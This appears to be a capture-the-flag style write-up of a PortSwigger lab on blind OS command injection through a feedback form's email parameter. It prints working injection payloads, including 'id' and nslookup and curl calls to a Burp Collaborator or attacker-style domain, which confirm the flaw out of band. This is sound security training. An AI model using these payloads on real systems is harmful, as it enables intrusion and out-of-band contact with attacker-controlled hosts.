# Blind OS command injection with out-of-band interaction

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band), you'll learn: Blind OS command injection with out-of-band interaction! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains a blind OS [command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

## Exploition

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301135643.png)

In here, we can see there's a "Submit feedback" page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301135708.png)

Let's try to submit one:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301135743.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301135751.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301135807.png)

When we clicked the "Submit feedback" button, it'll send a POST request to `/feedback/submit`, with parameter `csrf`, `name`, `email`, `subject`, `message`, and the response is an empty JSON data.

Now, if the web application want to send an email to somewhere, **it could be using a Linux command called `mail`.**

That being said, we can try to do **OS command injection** in the `email` parameter:

```bash
|| id%0a
```

We **pipe (parse) the previous command into `id`**. Also, **we’ll need to provide a newline character(`\n` or `%0a` in URL encoding)**, to execute the `id` command.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301140340.png)

However, there's no output of our command in the response.

With that said, it might be vulnerable to blind OS command injection.

We can use an injected command that will trigger an out-of-band network interaction with a system that we control, using OAST techniques. For example:

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected.

- Go to Burp Suite's Collaborator, and copy the payload:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301140521.png)

- Send the payload:

**Payload:**
```bash
|| nslookup mlbzz36dwstcsyzbzens1q48lzrtfj38.oastify.com%0a
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301140612.png)

- Burp Suite's Collaborator:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301140627.png)

As you can see, we successfully **received 2 DNS lookups**, which means **the feedback function is indeed vulnerable to blind OS command injection**!!

**Besides from `nslookup`, we can also use `curl`:**
```bash
|| curl mlbzz36dwstcsyzbzens1q48lzrtfj38.oastify.com%0a
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301140810.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/OS-Command-Injection/OSCI-4/images/Pasted%20image%2020230301140717.png)

# What we've learned:

1. Blind OS command injection with out-of-band interaction